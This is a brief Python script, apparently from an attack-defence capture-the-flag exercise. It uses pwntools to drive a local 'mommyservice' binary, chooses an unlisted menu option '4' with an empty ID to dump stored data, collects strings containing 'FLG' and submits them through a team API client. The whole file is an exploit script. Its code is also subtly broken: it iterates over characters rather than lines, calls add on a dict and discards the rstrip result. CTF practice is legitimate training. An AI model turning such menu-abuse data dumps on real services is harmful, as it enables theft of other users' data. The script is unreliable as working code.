from pwn import *
from swpag_client import Team

p1 = process('mommyservice')
t = Team("apiserver", "teamapikey")

print(p1.recvuntil('(1-3):'))
print(p1.sendline('4'))
print(p1.recvuntil('ID?'))
print(p1.sendline("\n"))

data = p1.recvall().decode('latin')
flags = {}
for i in data:
    if i.find("FLG") != -1:
        i.rstrip("\n")
        flags.add(i)

print(t.submit_flag(flags))